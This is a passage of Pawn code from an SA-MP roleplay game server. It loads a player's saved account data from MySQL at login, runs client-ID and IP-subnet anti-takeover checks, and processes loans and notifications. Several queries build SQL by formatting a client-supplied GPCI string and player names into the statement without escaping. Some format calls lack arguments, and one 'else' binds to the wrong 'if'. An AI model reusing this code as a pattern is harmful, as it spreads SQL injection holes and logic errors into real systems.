	cache_get_row(0, 3, PI[playerid][pLastIP], dbHandle, 16); // ip
	PI[playerid][pAdmin] = cache_get_row_int(0, 6, dbHandle); // admin
	PI[playerid][pSecurityCode] = cache_get_row_int(0, 7, dbHandle); // securitycode
	PI[playerid][pAuthenticator] = cache_get_row_int(0, 7, dbHandle);
	PI[playerid][pCheckCode] = cache_get_row_int(0, 8, dbHandle); // checkcode
	cache_get_row(0, 9, PI[playerid][pMail], dbHandle, 64); // mail
	PI[playerid][pLevel] = cache_get_row_int(0, 10, dbHandle); // level
	PI[playerid][pCash] = cache_get_row_int(0, 11, dbHandle); // cash
	PI[playerid][pBank] = cache_get_row_int(0, 12, dbHandle); // bank
	PI[playerid][pExp] = cache_get_row_int(0, 13, dbHandle); // exp
	cache_get_row(0, 14, PI[playerid][pRegIP], dbHandle, 16); // regip
	cache_get_row(0, 15, PI[playerid][pRegData], dbHandle, 15); // datareg
	PI[playerid][pLeader] = cache_get_row_int(0, 16, dbHandle); // leader
	PI[playerid][pTempLeader] = cache_get_row_int(0, 17, dbHandle); // templeader
	PI[playerid][pMember] = cache_get_row_int(0, 18, dbHandle); // member
	PI[playerid][pRank] = cache_get_row_int(0, 19, dbHandle); // rank
	PI[playerid][pWarn] = cache_get_row_int(0, 20, dbHandle); // warn
	PI[playerid][pSex] = cache_get_row_int(0, 21, dbHandle); // sex
	PI[playerid][pAge] = cache_get_row_int(0, 22, dbHandle); // age
	PI[playerid][pModel] = cache_get_row_int(0, 23, dbHandle); // model
	PI[playerid][pMemberSkin] = cache_get_row_int(0, 24, dbHandle); // memberskin
	cache_get_row(0, 25, PI[playerid][pLics], dbHandle, 16); // lic
	PI[playerid][pMuted] = cache_get_row_int(0, 28, dbHandle); // mute
	PI[playerid][pCheckTime] = cache_get_row_int(0, 30, dbHandle); //checktime
	PI[playerid][pNews] = cache_get_row_int(0, 31, dbHandle); // news
	PI[playerid][pPhones] = cache_get_row_int(0, 33, dbHandle); // phonenumber
	PI[playerid][pPhoneNumber] = cache_get_row_int(0, 33, dbHandle); // phonenumber
	cache_get_row(0, 34, PI[playerid][pTexts], dbHandle, 20); // text
	PI[playerid][pJail] = cache_get_row_int(0, 35, dbHandle); // jail
	PI[playerid][pJailTime] = cache_get_row_int(0, 36, dbHandle); // jailtime
	PI[playerid][pWanted] = cache_get_row_int(0, 37, dbHandle); // wanted
	PI[playerid][pWantedTime] = cache_get_row_int(0, 38, dbHandle); // wantedtime
	cache_get_row(0, 39, PI[playerid][pWantedWho], dbHandle, MAX_PLAYER_NAME); // wantedwho
	cache_get_row(0, 40, PI[playerid][pWantedReason], dbHandle, 32); // wantedreason
	PI[playerid][pHeal] = cache_get_row_float(0, 41, dbHandle); // heal
	PI[playerid][pDrugs] = cache_get_row_int(0, 42, dbHandle); // drugs
	PI[playerid][pPatron] = cache_get_row_int(0, 43, dbHandle); // patron
	PI[playerid][pGunAmount] = cache_get_row_int(0, 44, dbHandle); // gunamount
	PI[playerid][pCrimes] = cache_get_row_int(0, 45, dbHandle); // crimes
	PI[playerid][pJob] = cache_get_row_int(0, 46, dbHandle); // job
	PI[playerid][pMarried] = cache_get_row_int(0, 47, dbHandle); // married
	cache_get_row(0, 48, PI[playerid][pWhoMarried], dbHandle, MAX_PLAYER_NAME); // whomarried
	cache_get_row(0, 49, PI[playerid][pReferal], dbHandle, MAX_PLAYER_NAME); // referal
	PI[playerid][pRefMoney] = cache_get_row_int(0, 50, dbHandle); // refmoney
	PI[playerid][pPayCheck] = cache_get_row_int(0, 51, dbHandle); // paycheck
	PI[playerid][pCharity] = cache_get_row_int(0, 52, dbHandle); // charity
	PI[playerid][pVip] = cache_get_row_int(0, 53, dbHandle); // vip
	PI[playerid][pVipTime] = cache_get_row_int(0, 54, dbHandle); // viptime
	PI[playerid][pTime] = cache_get_row_int(0, 55, dbHandle); // time
	PI[playerid][pFightStyle] = cache_get_row_int(0, 56, dbHandle); // fstyle
	PI[playerid][pCredits] = cache_get_row_int(0, 57, dbHandle); // credits
	PI[playerid][pTotalCredits] = cache_get_row_int(0, 58, dbHandle); // totalcredits
	PI[playerid][pSkin][0] = cache_get_row_int(0, 59, dbHandle); // skin1
	PI[playerid][pSkin][1] = cache_get_row_int(0, 60, dbHandle); // skin2
	PI[playerid][pSkin][2] = cache_get_row_int(0, 61, dbHandle); // skin3
	PI[playerid][pSpawnChange] = cache_get_row_int(0, 62, dbHandle); // spawnchange
	g_player_skills[playerid][S_GUN][0] = cache_get_row_int(0, 63, dbHandle); // sdpistol
	g_player_skills[playerid][S_GUN][1] = cache_get_row_int(0, 64, dbHandle); // deserteagle
	g_player_skills[playerid][S_GUN][2] = cache_get_row_int(0, 65, dbHandle); // shotgun
	g_player_skills[playerid][S_GUN][3] = cache_get_row_int(0, 66, dbHandle); // mp5
	g_player_skills[playerid][S_GUN][4] = cache_get_row_int(0, 67, dbHandle); // ak47
	g_player_skills[playerid][S_GUN][5] = cache_get_row_int(0, 68, dbHandle); // m4
	g_player_skills[playerid][S_GUN][6] = cache_get_row_int(0, 69, dbHandle); // pistol
	g_player_skills[playerid][S_GUN][7] = cache_get_row_int(0, 70, dbHandle); // microuzi
	PI[playerid][pHunger] = cache_get_row_int(0, 71, dbHandle); // hunger
	PI[playerid][pHealthS] = cache_get_row_int(0, 72, dbHandle); // healths
	PI[playerid][pSportExp] = cache_get_row_int(0, 73, dbHandle); // sportexp
	PI[playerid][pOnline] = cache_get_row_int(0, 74, dbHandle); // online
	PI[playerid][pZakon] = cache_get_row_int(0, 75, dbHandle); // zakon
	PI[playerid][pCity] = cache_get_row_int(0, 76, dbHandle); // city
	PI[playerid][pBed] = cache_get_row_int(0, 78, dbHandle); // bed
	PI[playerid][pWatch] = cache_get_row_int(0, 79, dbHandle); // watch
	PI[playerid][pSprunk] = cache_get_row_int(0, 81, dbHandle); // sprunk
	PI[playerid][pPhoneBalance] = cache_get_row_int(0, 83, dbHandle); // phonebalance
	//PI[playerid][pTruckSkill] = cache_get_row_int(0, 84, dbHandle); // truckskill
	/*PI[playerid][cModel][0] = cache_get_row_int(0, 85, dbHandle); // cModel
	PI[playerid][cClass][0] = cache_get_row_int(0, 86, dbHandle); // cClass
	PI[playerid][cFuel][0] = cache_get_row_int(0, 87, dbHandle); // cFuel
	PI[playerid][cColor][0] = cache_get_row_int(0, 88, dbHandle); // cColor1
	PI[playerid][cColor][1] = cache_get_row_int(0, 89, dbHandle); // cColor2
	PI[playerid][cLock][0] = cache_get_row_int(0, 90, dbHandle); // cLock
	PI[playerid][cCost][0] = cache_get_row_int(0, 91, dbHandle); // cCost
	cache_get_row(0, 92, PI[playerid][cVehcom], dbHandle, 64); // cVehcom
	PI[playerid][cPaintjob] = cache_get_row_int(0, 93, dbHandle); // cPaintjob*/
	PI[playerid][pAptechka] = cache_get_row_int(0, 94, dbHandle); // aptechka
	PI[playerid][pVoennik] = cache_get_row_int(0, 95, dbHandle); // Voennik
	cache_get_row(0, 97, PI[playerid][pImproves], dbHandle, 32); // improves
	PI[playerid][pSettings] = cache_get_row_int(0, 99, dbHandle); // settings
	PhoneNumbers[playerid][0] = cache_get_row_int(0, 100, dbHandle); // phnumber1
	PhoneNumbers[playerid][1] = cache_get_row_int(0, 101, dbHandle); // phnumber2
	PhoneNumbers[playerid][2] = cache_get_row_int(0, 102, dbHandle); // phnumber3
	PhoneNumbers[playerid][3] = cache_get_row_int(0, 103, dbHandle); // phnumber4
	PhoneNumbers[playerid][4] = cache_get_row_int(0, 104, dbHandle); // phnumber5
	PhoneNumbers[playerid][5] = cache_get_row_int(0, 105, dbHandle); // phnumber6
	PhoneNumbers[playerid][6] = cache_get_row_int(0, 106, dbHandle); // phnumber7 - кол-во штрафов
	PhoneNumbers[playerid][7] = cache_get_row_int(0, 107, dbHandle); // phnumber8 - цена оплаты штрафа
	PI[playerid][pMailConfirmed] = cache_get_row_int(0, 110, dbHandle); // mailconf

	/*PI[playerid][cX][0] = cache_get_row_float(0, 112, dbHandle);
	PI[playerid][cY][0] = cache_get_row_float(0, 113, dbHandle);
	PI[playerid][cZ][0] = cache_get_row_float(0, 114, dbHandle);
	PI[playerid][cA][0] = cache_get_row_float(0, 115, dbHandle);

	PI[playerid][cX][1] = cache_get_row_float(0, 116, dbHandle);
	PI[playerid][cY][1] = cache_get_row_float(0, 117, dbHandle);
	PI[playerid][cZ][1] = cache_get_row_float(0, 118, dbHandle);
	PI[playerid][cA][1] = cache_get_row_float(0, 119, dbHandle);
	PI[playerid][cModel][1] = cache_get_row_int(0, 120, dbHandle); // cModel
	PI[playerid][cClass][1] = cache_get_row_int(0, 121, dbHandle); // cClass
	PI[playerid][cFuel][1] = cache_get_row_int(0, 122, dbHandle); // cFuel
	PI[playerid][cColor1][0] = cache_get_row_int(0, 123, dbHandle); // cColor1
	PI[playerid][cColor1][1] = cache_get_row_int(0, 124, dbHandle); // cColor2
	PI[playerid][cLock][1] = cache_get_row_int(0, 125, dbHandle); // cLock
	PI[playerid][cCost][1] = cache_get_row_int(0, 126, dbHandle); // cCost
	cache_get_row(0, 127, PI[playerid][cVehcom][1], dbHandle, 64); // cVehcom
	PI[playerid][cPaintjob][1] = cache_get_row_int(0, 128, dbHandle); // cPaintjob
	cache_get_row(0, 129, PI[playerid][pNumberVehicle1], dbHandle, 64); // veh_number*/

	PI[playerid][P_FAMILY] = cache_get_row_int(0, 132, dbHandle); // fama

	if(PI[playerid][P_FAMILY] != -1) Iter_Add(FamilyMembers[PI[playerid][P_FAMILY]], playerid);

	PI[playerid][P_FAMILY_COLOR] = cache_get_row_int(0, 133, dbHandle);

	/*PI[playerid][pFamilyZam] = cache_get_row_int(0, 134, dbHandle); //zam
	*/
	Settings[playerid][0] = cache_get_row_int(0, 148, dbHandle); // set1
	Settings[playerid][1] = cache_get_row_int(0, 149, dbHandle); // set2
	Settings[playerid][2] = cache_get_row_int(0, 150, dbHandle); // set3
	Settings[playerid][3] = cache_get_row_int(0, 151, dbHandle); // set4
	Settings[playerid][4] = cache_get_row_int(0, 152, dbHandle); // set5
	Settings[playerid][5] = cache_get_row_int(0, 153, dbHandle); // set6
	Settings[playerid][6] = cache_get_row_int(0, 153, dbHandle); // set7
	PI[playerid][pLWarn] = cache_get_row_int(0, 159, dbHandle); // lwarn
	PI[playerid][pAWarn] = cache_get_row_int(0, 160, dbHandle); // awarn
	PI[playerid][pDeActivate] = cache_get_row_int(0, 161, dbHandle); // deactivate
	admin_ban_time[playerid] = cache_get_row_int(0, 162, dbHandle);
	PI[playerid][pDonateCar] = cache_get_row_int(0, 163, dbHandle);

	/*PI[playerid][cX][2] = cache_get_row_float(0, 164, dbHandle);
	PI[playerid][cY][2] = cache_get_row_float(0, 165, dbHandle);
	PI[playerid][cZ][2] = cache_get_row_float(0, 166, dbHandle);
	PI[playerid][cA][2] = cache_get_row_float(0, 167, dbHandle);

	PI[playerid][cModel][2] = cache_get_row_int(0, 168, dbHandle); // cModel
	PI[playerid][cClass][2] = cache_get_row_int(0, 169, dbHandle); // cClass
	PI[playerid][cFuel][2] = cache_get_row_int(0, 170, dbHandle); // cFuel
	PI[playerid][cColor2][0] = cache_get_row_int(0, 171, dbHandle); // cColor1
	PI[playerid][cColor2][1] = cache_get_row_int(0, 172, dbHandle); // cColor2
	PI[playerid][cLock][2] = cache_get_row_int(0, 173, dbHandle); // cLock
	PI[playerid][cCost][2] = cache_get_row_int(0, 174, dbHandle); // cCost
	cache_get_row(0, 175, PI[playerid][cVehcom][2], dbHandle, 64); // cVehcom
	PI[playerid][cPaintjob][2] = cache_get_row_int(0, 176, dbHandle); // cPaintjob
	cache_get_row(0, 177, PI[playerid][pNumberVehicle2], dbHandle, 64); // veh_number*/

	PI[playerid][pCredit] = cache_get_row_int(0, 178, dbHandle);
	PI[playerid][pCreditMoney] = cache_get_row_int(0, 179, dbHandle);

	PI[playerid][pCopter] = cache_get_row_int(0, 180, dbHandle);
	PI[playerid][pCopterColor][0] = cache_get_row_int(0, 181, dbHandle);
	PI[playerid][pCopterColor][1] = cache_get_row_int(0, 182, dbHandle);

	PI[playerid][P_ENTRANCE] = cache_get_row_int(0, 184, dbHandle);
	PI[playerid][P_ROOM] = cache_get_row_int(0, 185, dbHandle);
	PI[playerid][pFracWarn] = cache_get_field_content_int(0, "fracwarn", dbHandle);
	PI[playerid][pBottles] = cache_get_field_content_int(0, "bottles_count", dbHandle);
	PI[playerid][pMaxBottles] = cache_get_field_content_int(0, "max_bottles", dbHandle);

	new l_bottles[57];

	cache_get_row(0, 188, bottles, dbHandle, 300);

	sscanf(bottles, "p<,>a<i>[57]", l_bottles);
	for(new i; i < MAX_BOTTLES; i++) g_bottles[playerid][i] = l_bottles[i];

	for(new idx; idx < MAX_BOTTLES; idx ++)
	{
		if(!g_bottles[playerid][idx])
		{
			g_bottles_object[playerid][idx] = CreatePlayerObject(playerid, 1486, coord_bottles_pickup[idx][0], coord_bottles_pickup[idx][1], coord_bottles_pickup[idx][2], 0.0, 0.0, 0.0);

			/*STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Pickup: %d", g_bottles_object[playerid][idx]);
			SendClientMessage(playerid, -1, STRING_GLOBAL);*/
		}
	}
	/*new present[64];

	cache_get_row(0, 183, present, dbHandle, 64);

	new l_present[41];

	sscanf(present, "p<,>a<i>[41]", l_present);
	for(new i; i < 41; i++) PI[playerid][pPresent][i] = l_present[i];*/

	new l_guns[56], l_ammo[56];

	cache_get_row(0, 26, l_guns, dbHandle, 64); // guns
	cache_get_row(0, 27, l_ammo, dbHandle, 64); // ammos

	new g_data[13], a_data[13];
	sscanf(l_guns, "p<,>a<i>[13]", g_data);
	sscanf(l_ammo, "p<,>a<i>[13]", a_data);
	for(new i; i < 13; i++)
	{
	    PI[playerid][pGun][i] = g_data[i];
	    PI[playerid][pAmmo][i] = a_data[i];
	}
	SetPVarInt(playerid, "Connected", 1);

	sscanf(PI[playerid][pTexts], "p<,>a<i>[4]", PI[playerid][pText]);
	sscanf(PI[playerid][pPhones], "p<,>a<i>[2]", PI[playerid][pPhone]);
	sscanf(PI[playerid][pImproves], "p<,>a<i>[4]", PI[playerid][pImprove]);
	sscanf(PI[playerid][pLics], "p<,>a<i>[4]",PI[playerid][pLic]);

	DeletePVar(playerid, "Logged");
	DeletePVar(playerid, "avttimer");
	PI[playerid][pOnline] = 1;
	MysqlUpdatePlayerInt(playerid, "online", PI[playerid][pOnline]);
	format(MdPanel, sizeof(MdPanel),"%i, %i, %i, %i, %i, %i", MD[0], MD[1], MD[2], MD[3], MD[4], MD[5]);
	MysqlUpdateOtherStr("mdpanel", MdPanel);

	for(new i = 25; i >= 0; i --) SendClientMessage(playerid, COLOR_WHITE, "");
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"SELECT * FROM "T_INVENT" WHERE `Name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "LoadPlayerItem","d", playerid);

    GetPlayerIp(playerid, PI[playerid][pIP], 16);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE "T_ACCOUNTS" SET ip = '%s', online = '1' WHERE id = '%i' LIMIT 1", PI[playerid][pIP], PI[playerid][pID]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	SetPlayerInterior(playerid, 0);

	new fmt_query[256];
	new Cache: result;
	new buffer[128];

	GetPVarString(playerid, "gpci", buffer, sizeof buffer);

	format(fmt_query, sizeof fmt_query, "SELECT name FROM family WHERE id = %d", PI[playerid][P_FAMILY]);
	result = mysql_query(dbHandle, fmt_query);

	if(cache_num_rows())
	{
		new name[64];
		cache_get_field_content(0, "name", name);
		FamilyName[playerid] = CreateDynamic3DTextLabel(name, 0xFFFFFFFF, 0.0, 0.0, 0.5, 10.0, playerid);
	}
	cache_delete(result);

	format(fmt_query, sizeof fmt_query, "SELECT * FROM gpci WHERE name='%s'", GetName(playerid));
	result = mysql_query(dbHandle, fmt_query);
	rows = cache_num_rows();

	if(!rows)
	{
	    cache_delete(result);

		format(fmt_query, sizeof fmt_query, "INSERT INTO gpci (`key`, `name`) VALUES ('%s', '%s')", buffer, GetName(playerid));
		mysql_query(dbHandle, fmt_query);
	}
	else
	{
		new client_id[128];

		cache_get_field_content(0, "key", client_id);

		cache_delete(result);

		new currect_subnet[8], last_subnet[8];

		last_subnet[0]	=
		currect_subnet[0] = EOS;

		strcat(last_subnet, "%s", GetIpSubnet(PI[playerid][pLastIP]));
		strcat(currect_subnet, "%s", GetPlayerSubnet_(playerid, currect_subnet, sizeof currect_subnet));

		if(strcmp(client_id, buffer, true) && strcmp(last_subnet, currect_subnet, true))
		//if(strcmp(last_subnet, currect_subnet, true))
		{
		    format(fmt_query, sizeof fmt_query, "{AFAFAF}[{FF6600}RSS{AFAFAF}] Проверьте игрока %s[%d] (acc: %d) возможно он взломан/передан/продан", GetName(playerid));
		    SendClientMessageToAll(0xFF5533FF, fmt_query);
			//SendAdminMessage(0xFF5533FF, fmt_query);

		    if(PI[playerid][pAdmin])
		    {
			    SendClientMessage(playerid, 0xFFCD00FF, "Система безопасности не позволяем Вам зайти на аккаунт в данный момент");
			    SendClientMessage(playerid, 0x3399FFFF, "Для восстановления доступа к аккаунту обратитесь к администрации: vk.com/cromulent_online");

			    printf("%s[%d] tried to connect with another client ID");
			    printf("ORIGINAL: %s / NOW: %s", buffer, client_id);

			    KickEx(playerid, "Несоответствие GPCI");

				return 1;
			}

		}
	}

	if(PI[playerid][pCheckCode] == 1)
	{
	    new texter_pas[5];
		new digitsd[9] = {1,2,3,4,5,6,7,8,9};
		for(new i, rand, old_digit; i < 9; i++)
		{
			while((rand = random(9)) == i) {}
			old_digit = digitsd[i];
			digitsd[i] = digitsd[rand];
			digitsd[rand] = old_digit;
		}
    	for(new f = 0; f < 10; f++)
		{
		    if(f < 9)
		    {
		        mass_pass[playerid][f] = digitsd[f];
				format(texter_pas,sizeof(texter_pas),"%i",mass_pass[playerid][f]);
				PlayerTextDrawSetString(playerid,SecurityCode[playerid][f],texter_pas);
		    }
			PlayerTextDrawShow(playerid,SecurityCode[playerid][f]);
		}
		SendClientMessage(playerid, COLOR_WHITE, "Система безопасности запрашивает ввод Вашего графического пароля");
		PI[playerid][pInputCode] = 0;
		Ujahhs[playerid] = 1;
		SelectTextDraw(playerid, -264092161);
	}
	else if(PI[playerid][pCheckCode] == 2)
	{
	    if(!strcmp(PI[playerid][pLastIP],PI[playerid][pIP],true))
		{
		    if(PI[playerid][pAdmin] > 1) SendClientMessage(playerid, COLOR_WHITE, "Вы вошли как администратор. Для авторизации введите ({FFCC00}/alogin{FFFFFF})");

			/*if(strlen(PI[playerid][GOOGLEAUTH]) > 2)
			{
				if(PI[playerid][GOOGLEAUTHSETTING] == 0)
				{
					if(CheckSubnet(playerid) == 1)
					{
						PlayerLogged[playerid] = true;
						Hunger(playerid, 0);
						TogglePlayerSpectating(playerid, false);
						SpawnPlayer(playerid);
					}
					else ShowPlayerDialog(playerid, DIALOG_GOOGLE_CHECK, DIALOG_STYLE_INPUT, !"{FFCC00}Google Authenticator", !"{FFFFFF}Введите код из приложения Google Authenticator в поле ниже:", !"Далее", "");
				}
				else if(PI[playerid][GOOGLEAUTHSETTING] == 1)
				{
					ShowPlayerDialog(playerid, DIALOG_GOOGLE_CHECK, DIALOG_STYLE_INPUT, !"{FFCC00}Google Authenticator", !"{FFFFFF}Введите код из приложения Google Authenticator в поле ниже:", !"Далее", "");
				}
			}*/
			else
			{
				PlayerLogged[playerid] = true;
				TogglePlayerSpectating(playerid, false);
				SpawnPlayer(playerid);
			}
		}
		else
		{
		    new texter_pas[5];
			new digitsd[9] = {1,2,3,4,5,6,7,8,9};
			for(new i, rand, old_digit; i < 9; i++)
			{
				while((rand = random(9)) == i) {}
				old_digit = digitsd[i];
				digitsd[i] = digitsd[rand];
				digitsd[rand] = old_digit;
			}
	    	for(new f = 0; f < 10; f++)
			{
			    if(f < 9)
			    {
			        mass_pass[playerid][f] = digitsd[f];
					format(texter_pas,sizeof(texter_pas),"%i",mass_pass[playerid][f]);
					PlayerTextDrawSetString(playerid,SecurityCode[playerid][f],texter_pas);
			    }
				PlayerTextDrawShow(playerid,SecurityCode[playerid][f]);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Система безопасности запрашивает ввод Вашего графического пароля");
			PI[playerid][pInputCode] = 0;
			Ujahhs[playerid] = 1;
			SelectTextDraw(playerid,-264092161);
		}
	}
	else if(PI[playerid][pCheckCode] == 3)
	{
	    new strv[26], strvv[26], splitt[4][4], spli[4][4];
	    split(PI[playerid][pLastIP], splitt, '.');
		format(strv, sizeof(strv), "%s.%s", splitt[0], splitt[1]);
	    split(PI[playerid][pIP], spli, '.');
		format(strvv, sizeof(strvv), "%s.%s", spli[0], spli[1]);
	    if(strcmp(strv,strvv,true))
		{
		    new texter_pas[5];
			new digitsd[9] = {1,2,3,4,5,6,7,8,9};
			for(new i, rand, old_digit; i < 9; i++)
			{
				while((rand = random(9)) == i) {}
				old_digit = digitsd[i];
				digitsd[i] = digitsd[rand];
				digitsd[rand] = old_digit;
			}
	    	for(new f = 0; f < 10; f++)
			{
			    if(f < 9)
			    {
			        mass_pass[playerid][f] = digitsd[f];
					format(texter_pas,sizeof(texter_pas),"%i",mass_pass[playerid][f]);
					PlayerTextDrawSetString(playerid,SecurityCode[playerid][f],texter_pas);
			    }
				PlayerTextDrawShow(playerid,SecurityCode[playerid][f]);
			}
			SendClientMessage(playerid, COLOR_WHITE, "Система безопасности запрашивает ввод Вашего графического пароля");
			PI[playerid][pInputCode] = 0;
			Ujahhs[playerid] = 1;
			SelectTextDraw(playerid,-264092161);
		}
		else
		{
		    PlayerLogged[playerid] = true;
			TogglePlayerSpectating(playerid, false);
   			SpawnPlayer(playerid);

			//if(!PI[playerid][pMailConfirmed] && PI[playerid][pLevel] < 3) SendClientMessage(playerid, COLOR_YELLOW, "Ваша почта не привязана. Привяжите её, чтобы потвердить Ваш аккаунт (/menu - Безопасность)");
		}
	}
	else
	{
	    if(PI[playerid][pAdmin] > 1) SendClientMessage(playerid, C_BLUE, "Вы вошли как администратор. Для авторизации введите ({FFCC00}/alogin{3399ff})");
	    //if(!PI[playerid][pMailConfirmed] && PI[playerid][pLevel] < 3) SendClientMessage(playerid, COLOR_YELLOW, "Ваша почта не привязана. Привяжите её, чтобы потвердить Ваш аккаунт (/menu - Безопасность)");
	    PlayerLogged[playerid] = true;
		TogglePlayerSpectating(playerid, false);
	    SpawnPlayer(playerid);
	}

	if(PI[playerid][pCredit] > 0)
	{
		if(PI[playerid][pCredit] <= gettime())
		{
			new fmt_msg[128];
			if(PI[playerid][pBank] >= PI[playerid][pCreditMoney])
			{
				PI[playerid][pBank] -= PI[playerid][pCreditMoney];
				MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);

				format(fmt_msg, sizeof fmt_msg, "Срок кредита подошёл. С Вашего банковского счёта было списано: %d рублей", PI[playerid][pCreditMoney]);
				SendClientMessage(playerid, C_YELLOW, fmt_msg);

				PI[playerid][pCredit] =
				PI[playerid][pCreditMoney] = 0;

				MysqlUpdatePlayerInt(playerid, "credit", PI[playerid][pCredit]);
				MysqlUpdatePlayerInt(playerid, "creditmoney", PI[playerid][pCreditMoney]);
			}
			else
			{
				SendClientMessage(playerid, C_YELLOW, "Срок кредита подошёл. Но на Вашем банковском счету недостаточно денег.");
				SendClientMessage(playerid, C_YELLOW, "На Вашем аккаунте было продано всё имущество.");

				if(GetPlayerHouse(playerid))
				{
					new i = GetPVarInt(playerid, "PlayerHouse");
					strmid(HouseInfo[i][hOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
					PI[playerid][pSpawnChange] = 0;
					MysqlUpdatePlayerInt(playerid, "spawnchange", PI[playerid][pSpawnChange]);
					MysqlUpdateHouseStr(i, "hOwner", "None");
					HouseInfo[i][hLock] = 1;
					HouseInfo[i][hOplata] = HouseInfo[i][hGarage] = HouseInfo[i][hAutoDoors] = 0;
					UpdateHouse(i);

                    STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET  hOwner = '%s', buyprice = 0, hLock = %d, hOplata = 0, hGarage = 0, hAutoDoors = 0 WHERE id = '%d' LIMIT 1", HouseInfo[i][hOwner], HouseInfo[i][hLock], i);
					mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
					if(GetPlayerVirtualWorld(playerid) == HouseInfo[i][hVirtual])
					{
						SetPlayerInterior(playerid, 0);
						SetPlayerVirtualWorld(playerid, 0);
						SetPlayerPos(playerid, HouseInfo[i][hEntrx], HouseInfo[i][hEntry], HouseInfo[i][hEntrz]);
						DeletePVar(playerid, "PlayerHouse");
					}
				}

				if(GetPlayerBizz(playerid))
				{
					new i = GetPVarInt(playerid, "PlayerBizz");
					strmid(BizzInfo[i][bOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
					BizzInfo[i][bLock] = BizzInfo[i][bBuyPrice] = BizzInfo[i][bMoney] = BizzInfo[i][bEnter] = BizzInfo[i][bControl] = 0;
					BizzInfo[i][bTill] = 50;
					switch(BizzInfo[i][bType])
					{
						case 1: BizzInfo[i][bProduct] = 1000;
						case 2: BizzInfo[i][bProduct] = 1000;
						case 3: BizzInfo[i][bProduct] = 1000;
						case 4: BizzInfo[i][bProduct] = 1000;
						case 5: BizzInfo[i][bProduct] = 1000;
						case 6: BizzInfo[i][bProduct] = 1000;
						case 7: BizzInfo[i][bProduct] = 1000;
						case 8: BizzInfo[i][bProduct] = 1000;
						case 9: BizzInfo[i][bProduct] = 1000;
					}
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_BIZZ" SET owner='%s', block=%d, money=%d, penter=%d, till=%d, buyprice=%d , product=%d WHERE id = %d",
					BizzInfo[i][bOwner], BizzInfo[i][bLock], BizzInfo[i][bMoney], BizzInfo[i][bEnter], BizzInfo[i][bTill], BizzInfo[i][bBuyPrice], BizzInfo[i][bProduct],i);
					mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
					UpdateBizz(i);
				}

				PI[playerid][pCredit] =
				PI[playerid][pCreditMoney] = 0;

				MysqlUpdatePlayerInt(playerid, "credit", PI[playerid][pCredit]);
				MysqlUpdatePlayerInt(playerid, "creditmoney", PI[playerid][pCreditMoney]);
			}
		}
		else
		{
			new fmt_msg[128];
			format(fmt_msg, sizeof fmt_msg, "Напоминаем, что у Вас есть кредит на сумму %d рублей. Срок оплаты: %d дней", PI[playerid][pCreditMoney], ((PI[playerid][pCredit] - gettime()) / 86400) + 1);
			SendClientMessage(playerid, COLOR_YELLOW, fmt_msg);
		}
	}

	if(PI[playerid][pText][0] == 1)
	{
		new i = PI[playerid][pText][0];
		PI[playerid][pBank] += HouseInfo[i][hPrice];
		SendMes(playerid, COLOR_YELLOW, "Вы были выселены за неуплату! Вам было возвращено %dр", HouseInfo[i][hPrice]);
		SendClientMessage(playerid, COLOR_YELLOW, "Деньги были переведены на Ваш банковский счет.");
		format(PI[playerid][pTexts], 20,  "0, %i, %i, %i", PI[playerid][pText][1], PI[playerid][pText][2], PI[playerid][pText][3]);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 256, "UPDATE "T_ACCOUNTS" SET text = '%s', bank=%d WHERE name = '%s'", PI[playerid][pTexts], PI[playerid][pBank], GetName(playerid));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	if(PI[playerid][pText][1] == 1)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "[Налоговая служба] Ваш бизнес закрыли в связи с нехваткой ресурсов");
		SendClientMessage(playerid, COLOR_YELLOW, "[Налоговая служба] Бюджет бизнеса зачислен на Ваш банковский счет");
		format(PI[playerid][pTexts], 20, "%i, 0, %i, %i", PI[playerid][pText][0], PI[playerid][pText][2], PI[playerid][pText][3]);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 256, "UPDATE "T_ACCOUNTS" SET text = '%s', bank=%d WHERE name = '%s'", PI[playerid][pTexts], PI[playerid][pBank], GetName(playerid));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	/*if(PI[playerid][pText][2] == 1)
	{
		GiveMoney(playerid, 100000);
		SendClientMessage(playerid, COLOR_YELLOW, "Вы получили 100000р за приглашенного игрока");
		PI[playerid][pRefMoney] = 0;
		format(PI[playerid][pTexts], 20, "%i, %i, 0, %i", PI[playerid][pText][0], PI[playerid][pText][1], PI[playerid][pText][3]);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 256, "UPDATE "T_ACCOUNTS" SET text = '%s', refmoney = %d WHERE name = '%s'", PI[playerid][pTexts], PI[playerid][pRefMoney], GetName(playerid));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}*/
	if(PI[playerid][pText][3] == 1)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "На Ваш счёт поступил донат платёж (/donate - Проверить зачисления)");
		format(PI[playerid][pTexts], 20, "%i, %i, %i, 0", PI[playerid][pText][0], PI[playerid][pText][1], PI[playerid][pText][2]);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 256, "UPDATE "T_ACCOUNTS" SET text = '%s' WHERE name = '%s'", PI[playerid][pTexts], GetName(playerid));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	if(PI[playerid][pVipTime] > 0)
	{
	    new year, month, day;
		new current_date = getdate(year, month, day);
		new time_left = PI[playerid][pVipTime] - current_date;
		if(time_left <= 0)
		{
